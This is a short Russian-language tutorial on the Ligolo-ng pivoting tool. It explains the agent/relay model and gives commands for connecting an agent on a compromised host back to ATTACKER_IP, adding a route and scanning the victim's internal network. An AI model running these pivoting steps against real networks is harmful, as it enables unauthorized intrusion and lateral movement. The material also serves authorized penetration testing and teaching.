**Ligolo-ng** - это инструмент для `pivoting`, который создаёт полноценный сетевой интерфейс (TUN) на машине атакующего и подключает его к скомпрометированному хосту.

> Машина атакующего становится частью внутренней сети жертвы

Он работает по модели **agent ↔ relay**, где:
- агент запускается на compromised host
- relay запускается у атакующего

## Как работает

1. Агент на compromised host инициирует TLS‑соединение к relay.
2. Relay создаёт виртуальный интерфейс (например, ligolo).
3. Ты добавляешь маршрут в систему.
4. Трафик к внутренней сети отправляется через этот интерфейс.
5. Агент пересылает пакеты в реальную внутреннюю сеть.

> Ключевой момент:
   Ligolo работает на уровне IP, а не на уровне прокси.
   Это почти VPN.

## Использование

1. На атакующей машине:
Запускаем relay:
```bash
ligolo-ng relay
```
Создаётся TLS listener.

2. На compromised host:
```bash
ligolo-ng agent -connect ATTACKER_IP:11601 -ignore-cert
```
Агент подключается к relay.

3. На атакующей машине:
В консоли relay:
```
session  
start
```

Создаём TUN интерфейс:
```bash
ifconfig
```
Появляется интерфейс типа: `ligolo`

4. Добавляем маршрут:
```bash
sudo ip route add 192.168.2.0/24 dev ligolo
```

Теперь можно делать:
```bash
ping/nmap 192.168.2.10
```

Без proxychains.
Без SOCKS.
Прямой IP‑трафик.
